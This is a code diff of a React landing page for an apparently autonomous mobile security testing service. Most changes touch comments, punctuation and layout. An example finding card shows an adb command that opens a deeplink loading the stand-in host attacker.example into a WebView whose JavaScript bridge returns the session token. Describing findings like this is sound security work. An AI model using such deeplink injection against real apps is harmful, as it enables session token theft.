@@ -8,7 +8,7 @@ const services = [
   { number: '03', title: 'Dynamic proof', text: 'Real devices. Real traffic. Real abuse cases. Every dynamic finding is reproduced on a live device and captured as evidence.' },
 ]
 
-// ─── Rate-limit helpers (client-side, localStorage) ─────────────────────────
+// Rate-limit helpers (client-side, localStorage)
 const RATE_LIMIT_KEY = 'oxd_form_submissions'
 const RATE_LIMIT_MAX = 3          // max submissions
 const RATE_LIMIT_WINDOW = 3600000 // 1 hour in ms
@@ -34,7 +34,6 @@ function recordSubmission() {
     .concat(now)
   localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(entries))
 }
-// ─────────────────────────────────────────────────────────────────────────────
 
 export default function Page() {
   const [menuOpen, setMenuOpen] = useState(false)
@@ -42,9 +41,9 @@ export default function Page() {
   const [submitted, setSubmitted] = useState(false)
   const [loading, setLoading] = useState(false)
   const [formError, setFormError] = useState('')
-  // Timestamp set when modal opens — used to detect instant (bot) submissions
+  // Timestamp set when modal opens; used to detect instant (bot) submissions
   const [formOpenedAt, setFormOpenedAt] = useState<number>(0)
-  // ── Early-access waitlist state ────────────────────────────────────────────
+  // Early-access waitlist state
   const [waitLoading, setWaitLoading] = useState(false)
   const [waitDone, setWaitDone] = useState(false)
   const [waitError, setWaitError] = useState('')
@@ -63,7 +62,7 @@ export default function Page() {
     const form = event.currentTarget
     const formData = new FormData(form)
 
-    // ── 1. Honeypot check — bots fill hidden fields, humans don't ────────────
+    // 1. Honeypot check: bots fill hidden fields, humans don't
     const honeypot = formData.get('_honey') as string
     if (honeypot && honeypot.trim() !== '') {
       // Silently pretend success to fool bots
@@ -71,14 +70,14 @@ export default function Page() {
       return
     }
 
-    // ── 2. Timing gate — reject if form submitted in < 3 seconds ─────────────
+    // 2. Timing gate: reject if form submitted in < 3 seconds
     const elapsed = Date.now() - formOpenedAt
     if (elapsed < 3000) {
       setFormError('Please take a moment to review your message before sending.')
       return
     }
 
-    // ── 3. Client-side rate limit — max 3 per hour ───────────────────────────
+    // 3. Client-side rate limit: max 3 per hour
     if (isRateLimited()) {
       setFormError('Too many requests. Please try again in an hour, or email us directly at support@oxdroid.io.')
       return
@@ -124,7 +123,7 @@ export default function Page() {
     }
   }
 
-  // ── Early-access waitlist: email-only, lands in the same portal inbox ──────
+  // Early-access waitlist: email-only, lands in the same portal inbox
   async function submitWaitlist(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault()
     setWaitError('')
@@ -132,16 +131,16 @@ export default function Page() {
     const form = event.currentTarget
     const formData = new FormData(form)
 
-    // Honeypot — bots fill hidden fields, humans don't
+    // Honeypot: bots fill hidden fields, humans don't
     const honeypot = formData.get('_honey') as string
     if (honeypot && honeypot.trim() !== '') {
       setWaitDone(true)
       return
     }
 
-    // Timing gate — reject instant (bot) submissions
+    // Timing gate: reject instant (bot) submissions
     if (!waitOpenedAt || Date.now() - waitOpenedAt < 3000) {
-      setWaitError('One moment — type your email, then send.')
+      setWaitError('One moment. Type your email, then send.')
       return
     }
 
@@ -211,7 +210,7 @@ export default function Page() {
           <div className="hero-proof">
             <div className="proof-cell"><b>18/18</b><span>planted issues found on our ground-truth benchmark</span></div>
             <div className="proof-cell"><b>Real devices</b><span>every dynamic finding reproduced, not inferred</span></div>
-            <div className="proof-cell"><b>Zero</b><span>findings shipped without evidence — by invariant, not policy</span></div>
+            <div className="proof-cell"><b>Zero</b><span>findings shipped without evidence. By invariant, not policy.</span></div>
           </div>
         </div>
         <div className="hero-diagram ascii-mascot" aria-label="Animated ASCII art of the oxdroid mascot" role="img">
@@ -282,13 +281,22 @@ export default function Page() {
       <section className="statement section-pad"><p className="section-kicker">Autonomous by design</p><h2>The depth of a researcher.<br /><span>The speed of a machine.</span></h2><div className="statement-bottom"><p>Manual audits do not scale, so most apps get tested once a quarter, if that. oxdroid runs the full assessment autonomously and a researcher reviews the proof, so you get expert depth on every release.</p><span className="big-index">01.</span></div></section>
 
       <section className="artifact section-pad dark-section" aria-label="Example finding">
-        <div className="section-heading"><p className="section-kicker lime-text">What lands in your queue</p><h2>Not a report.<br /><span>A reproduction.</span></h2><p className="heading-note">Every finding ships the way the engine proved it — the chain, the exact commands, the captured screen. This is a real shape from a real run, abridged.</p></div>
-        <div className="finding-card" role="img" aria-label="Example oxdroid finding card">
-          <div className="fc-head"><span className="fc-id">VULN-0142</span><span className="fc-sev">HIGH</span><span className="fc-status">CONFIRMED</span><span className="fc-chain">DEEPLINK → WEBVIEW → JS BRIDGE</span></div>
-          <h3>Deeplink loads attacker URL into a WebView with a token-exposing bridge</h3>
-          <p>The app&apos;s browsable deeplink forwards its URL parameter into WebView.loadUrl() without an origin allowlist. The injected page reaches addJavascriptInterface methods that return the session token.</p>
-          <div className="fc-evidence"><span className="fc-tag">evidence</span><code>adb shell am start -a android.intent.action.VIEW -d &quot;app://web?url=https://attacker.example&quot;</code><code>HAR entry: Authorization: Bearer eyJhbGciOi… (captured)</code><code>frame: poc/screenshots/VULN-0142/after.png</code></div>
-          <div className="fc-foot"><span>reproduced on device · 1 command</span><span>CVSS 8.2 · AV:N/AC:L</span></div>
+        <div className="section-heading"><p className="section-kicker lime-text">What lands in your queue</p><h2>Not a report.<br /><span>A reproduction.</span></h2><p className="heading-note">Every finding ships the way the engine proved it: the chain, the exact commands, and the captured screen. This is a real shape from a real run, abridged.</p></div>
+        <div className="product-window" role="img" aria-label="oxdroid console showing a confirmed finding">
+          <div className="pw-bar">
+            <span className="pw-dots"><i /><i /><i /></span>
+            <span className="pw-tabs"><b className="pw-tab active">Findings</b><b className="pw-tab">Coverage</b><b className="pw-tab">Evidence</b></span>
+            <span className="pw-meta">dk.royalarena · scan #1788 · <em>live</em></span>
+          </div>
+          <div className="pw-body">
+            <div className="finding-card">
+              <div className="fc-head"><span className="fc-id">VULN-0142</span><span className="fc-sev">HIGH</span><span className="fc-status">CONFIRMED</span><span className="fc-chain">DEEPLINK → WEBVIEW → JS BRIDGE</span></div>
+              <h3>Deeplink loads attacker URL into a WebView with a token-exposing bridge</h3>
+              <p>The app&apos;s browsable deeplink forwards its URL parameter into WebView.loadUrl() without an origin allowlist. The injected page reaches addJavascriptInterface methods that return the session token.</p>
+              <div className="fc-evidence"><span className="fc-tag">evidence</span><code>adb shell am start -a android.intent.action.VIEW -d &quot;app://web?url=https://attacker.example&quot;</code><code>HAR entry: Authorization: Bearer eyJhbGciOi… (captured)</code><code>frame: poc/screenshots/VULN-0142/after.png</code></div>
+              <div className="fc-foot"><span>reproduced on device · 1 command</span><span>CVSS 8.2 · AV:N/AC:L</span></div>
+            </div>
+          </div>
         </div>
         <div className="ticker" aria-hidden="true"><div className="ticker-track"><span>DEEPLINK → WEBVIEW TOKEN EXPOSURE · CONFIRMED</span><span>EXPORTED ACTIVITY INTENT REDIRECTION · PROVEN</span><span>JS BRIDGE @JavascriptInterface TOKEN READ · CONFIRMED</span><span>CLIENT-STATE AUTH BYPASS · REPRODUCED</span><span>FIREBASE RTDB OPEN WRITE · PROVEN</span><span>NATIVE JNI OVERFLOW · CRASH REPRODUCED</span><span>DEEPLINK → WEBVIEW TOKEN EXPOSURE · CONFIRMED</span><span>EXPORTED ACTIVITY INTENT REDIRECTION · PROVEN</span><span>JS BRIDGE @JavascriptInterface TOKEN READ · CONFIRMED</span><span>CLIENT-STATE AUTH BYPASS · REPRODUCED</span><span>FIREBASE RTDB OPEN WRITE · PROVEN</span><span>NATIVE JNI OVERFLOW · CRASH REPRODUCED</span></div></div>
       </section>
@@ -298,10 +306,10 @@ export default function Page() {
       <section className="scope section-pad" id="scope"><div className="scope-intro"><p className="section-kicker">Built for mobile reality</p><h2>One audit.<br /><span>Clear signal.</span></h2><p>The autonomous engine maps your app against OWASP MASVS and the Mobile Top 10, then chains findings toward real impact. On a known ground-truth benchmark it found 18 of 18 planted issues.</p></div><div className="scope-grid"><div className="scope-card featured-scope"><span className="card-label">01 / COVERAGE</span><strong>iOS<br /><span>&</span> Android</strong><span className="card-line">Native, hybrid, and cross-platform</span></div><div className="scope-card"><span className="card-label">02 / OUTPUT</span><strong>Findings<br />that land.</strong><span className="card-line">Severity, evidence, reproduction, fix.</span></div><div className="scope-card scope-note"><span className="card-label">03 / STANDARD</span><strong>MASVS<br />ALIGNED</strong><span className="card-line">A rigorous baseline. Not a ceiling.</span></div></div></section>
 
       <section className="early-access section-pad dark-section" id="early-access">
-        <div className="section-heading"><p className="section-kicker lime-text">Early access — cohort 01</p><h2>The engine is running.<br /><span>Get your app in front of it.</span></h2><p className="heading-note">We onboard a handful of mobile teams at a time — engineer-to-engineer. You bring a release candidate; the engine brings the adversarial hours; a researcher signs off every finding before it reaches you.</p></div>
+        <div className="section-heading"><p className="section-kicker lime-text">Early access / cohort 01</p><h2>The engine is running.<br /><span>Get your app in front of it.</span></h2><p className="heading-note">We onboard a handful of mobile teams at a time, engineer to engineer. You bring a release candidate, the engine brings the adversarial hours, and a researcher signs off every finding before it reaches you.</p></div>
         <div className="waitlist-panel">
           {waitDone ? (
-            <div className="waitlist-done"><span className="success-mark">✓</span><div><b>You&apos;re on the list.</b><span>We&apos;ll reach out with an onboarding slot — one email, nothing else.</span></div></div>
+            <div className="waitlist-done"><span className="success-mark">✓</span><div><b>You&apos;re on the list.</b><span>We&apos;ll reach out with an onboarding slot. One email, nothing else.</span></div></div>
           ) : (
             <form className="waitlist-form" onSubmit={submitWaitlist}>
               <input type="text" name="_honey" defaultValue="" aria-hidden="true" tabIndex={-1} autoComplete="off" style={{ position: 'absolute', left: '-9999px', opacity: 0, height: 0, width: 0, pointerEvents: 'none' }} />
@@ -311,13 +319,13 @@ export default function Page() {
               {waitError && <p role="alert" className="waitlist-error">{waitError}</p>}
             </form>
           )}
-          <div className="waitlist-meta"><span>One email to schedule a slot — nothing else.</span><span>Live demo on your own build.</span><span>Latest benchmark write-up included.</span></div>
+          <div className="waitlist-meta"><span>One email to schedule a slot. Nothing else.</span><span>Live demo on your own build.</span><span>Latest benchmark write-up included.</span></div>
         </div>
       </section>
 
       <footer className="footer"><div className="footer-brand"><a className="brand" href="#top"><span className="brand-mark">ox</span>droid<span className="brand-dot">.</span></a><p>Mobile security for<br />what&apos;s next.</p></div><div className="footer-links"><div><span>Explore</span><a href="#approach">Approach</a><a href="#scope">Scope</a><a href="#early-access">Early access</a><a href="/privacy">Privacy policy</a><a href="/blogs">Journal</a></div><div><span>Say hello</span><a href="mailto:support@oxdroid.io">support@oxdroid.io</a><a href="https://github.com/oxdroid" target="_blank" rel="noreferrer">GitHub ↗</a><a href="https://www.linkedin.com/company/oxdroid" target="_blank" rel="noreferrer">LinkedIn ↗</a><a href="https://twitter.com/oxdroid" target="_blank" rel="noreferrer">Twitter ↗</a></div></div><div className="footer-bottom"><span>© 2026 oxdroid security lab</span><span>Built for the brave.</span></div></footer>
 
-      {modalOpen && <div className="modal-backdrop" role="presentation" onMouseDown={(event) => { if (event.target === event.currentTarget) { setModalOpen(false); setFormError('') } }}><div className="audit-modal" role="dialog" aria-modal="true" aria-labelledby="modal-title"><button className="modal-close" aria-label="Close request form" onClick={() => { setModalOpen(false); setFormError('') }}>×</button>{submitted ? <div className="success-state"><span className="success-mark">✓</span><p className="section-kicker lime-text">Message received</p><h2>Let&apos;s make<br />it <span>harder.</span></h2><p>We&apos;ll be in touch shortly to understand your app, your release, and where you need signal most.</p><button className="button button-lime" onClick={() => { setModalOpen(false); setSubmitted(false); setFormError('') }}>Back to site</button></div> : <><p className="section-kicker lime-text">Start a conversation</p><h2 id="modal-title">Request an<br /><span>audit.</span></h2><form onSubmit={submitAudit}>{/* Honeypot — hidden from humans, bots fill it automatically */}<input type="text" name="_honey" defaultValue="" aria-hidden="true" tabIndex={-1} autoComplete="off" style={{ position: 'absolute', left: '-9999px', opacity: 0, height: 0, width: 0, pointerEvents: 'none' }} /><label>Name<input required name="name" placeholder="Your name" /></label><label>Work email<input required type="email" name="email" placeholder="you@company.com" /></label><label>Tell us about the app<textarea required name="message" placeholder="What are you building?" rows={3} /></label>{formError && <p role="alert" style={{ color: '#c0392b', fontFamily: 'var(--font-mono)', fontSize: '11px', margin: '0', lineHeight: '1.5' }}>{formError}</p>}<button className="button button-lime" type="submit" disabled={loading}>{loading ? 'Sending request...' : <>Send request <span>↗</span></>}</button></form></>}</div></div>}
+      {modalOpen && <div className="modal-backdrop" role="presentation" onMouseDown={(event) => { if (event.target === event.currentTarget) { setModalOpen(false); setFormError('') } }}><div className="audit-modal" role="dialog" aria-modal="true" aria-labelledby="modal-title"><button className="modal-close" aria-label="Close request form" onClick={() => { setModalOpen(false); setFormError('') }}>×</button>{submitted ? <div className="success-state"><span className="success-mark">✓</span><p className="section-kicker lime-text">Message received</p><h2>Let&apos;s make<br />it <span>harder.</span></h2><p>We&apos;ll be in touch shortly to understand your app, your release, and where you need signal most.</p><button className="button button-lime" onClick={() => { setModalOpen(false); setSubmitted(false); setFormError('') }}>Back to site</button></div> : <><p className="section-kicker lime-text">Start a conversation</p><h2 id="modal-title">Request an<br /><span>audit.</span></h2><form onSubmit={submitAudit}>{/* Honeypot: hidden from humans, bots fill it automatically */}<input type="text" name="_honey" defaultValue="" aria-hidden="true" tabIndex={-1} autoComplete="off" style={{ position: 'absolute', left: '-9999px', opacity: 0, height: 0, width: 0, pointerEvents: 'none' }} /><label>Name<input required name="name" placeholder="Your name" /></label><label>Work email<input required type="email" name="email" placeholder="you@company.com" /></label><label>Tell us about the app<textarea required name="message" placeholder="What are you building?" rows={3} /></label>{formError && <p role="alert" style={{ color: '#c0392b', fontFamily: 'var(--font-mono)', fontSize: '11px', margin: '0', lineHeight: '1.5' }}>{formError}</p>}<button className="button button-lime" type="submit" disabled={loading}>{loading ? 'Sending request...' : <>Send request <span>↗</span></>}</button></form></>}</div></div>}
     </main>
   )
 }
